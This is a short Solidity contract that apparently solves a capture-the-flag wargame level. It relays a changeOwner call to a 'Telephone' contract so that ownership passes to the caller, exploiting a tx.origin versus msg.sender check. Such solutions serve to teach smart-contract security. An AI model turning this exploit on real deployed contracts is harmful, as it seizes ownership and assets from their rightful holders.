// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.8.17;

interface ITelephone {
    function changeOwner(address owner) external;
}

contract Claimer {
    ITelephone public telephone;

    constructor(address telephoneAddress) {
        telephone = ITelephone(telephoneAddress);
    }

    function claim() external {
        telephone.changeOwner(msg.sender);
    }
}
